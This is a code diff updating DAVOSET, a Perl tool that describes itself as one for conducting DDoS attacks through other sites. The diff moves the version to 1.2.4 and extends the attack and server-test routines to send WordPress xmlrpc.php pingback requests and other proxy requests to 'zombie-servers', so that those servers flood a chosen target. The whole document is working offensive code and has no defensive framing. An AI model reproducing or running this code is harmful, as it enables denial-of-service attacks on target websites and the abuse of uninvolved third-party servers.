@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.3
+# DAVOSET v.1.2.4
 # Tool for conducting of DDoS attacks on the sites via other sites
-# Copyright (C) MustLive 2010-2014
-# Last update: 15.11.2014
+# Copyright (C) MustLive 2010-2015
+# Last update: 31.03.2015
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.3"; # program version
+my $version = "1.2.4"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -143,7 +143,7 @@ sub Info { # info
 	print qq~
 DDoS attacks via other sites execution tool
 DAVOSET v.$version
-Copyright (C) MustLive 2010-2014
+Copyright (C) MustLive 2010-2015
 
 ~;
 }
@@ -160,9 +160,16 @@ sub Attack { # send request to zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
-	$url =~ m|(http://[^/]+)(/.+)?|;
-	$host = $1;
-	$page = $2;
+	if ($method eq "WP") {
+		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
+		$host = $1;
+		$page = $2;
+	}
+	else {
+		$url =~ m|(https?://[^/]+)(/.+)?|;
+		$host = $1;
+		$page = $2;
+	}
 	$page |= "/";
 	$port = $1 if ($host =~ /:(\d+)$/);
 	$port ||= $default_port;
@@ -205,7 +212,7 @@ sub Attack { # send request to zombie-server
 		$params =~ s|http://site|$site|;
 		if ($method eq "WP") {
 			$params =~ s|http://source|$host|;
-			$page = "/xmlrpc.php";
+			$page .= "xmlrpc.php";
 		}
 		print $sock "POST $page HTTP/1.1\n";
 		print $sock "Host: $host\n";
@@ -285,9 +292,16 @@ sub TestServer { # test zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
-	$url =~ m|(http://[^/]+)(/.+)?|;
-	$host = $1;
-	$page = $2;
+	if ($method eq "WP") {
+		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
+		$host = $1;
+		$page = $2;
+	}
+	else {
+		$url =~ m|(https?://[^/]+)(/.+)?|;
+		$host = $1;
+		$page = $2;
+	}
 	$page |= "/";
 	$port = $1 if ($host =~ /:(\d+)$/);
 	$port ||= $default_port;
@@ -326,8 +340,12 @@ sub TestServer { # test zombie-server
 		print $sock "Connection: close\n\n";
 		print $sock "$params\r\n\r\n";
 	}
-	elsif ($method eq "XML") {
+	elsif ($method eq "XML" or $method eq "WP") {
 		$params =~ s|http://site|$site|;
+		if ($method eq "WP") {
+			$params =~ s|http://source|$host|;
+			$page .= "xmlrpc.php";
+		}
 		print $sock "POST $page HTTP/1.1\n";
 		print $sock "Host: $host\n";
 		print $sock "User-Agent: $agent\n";
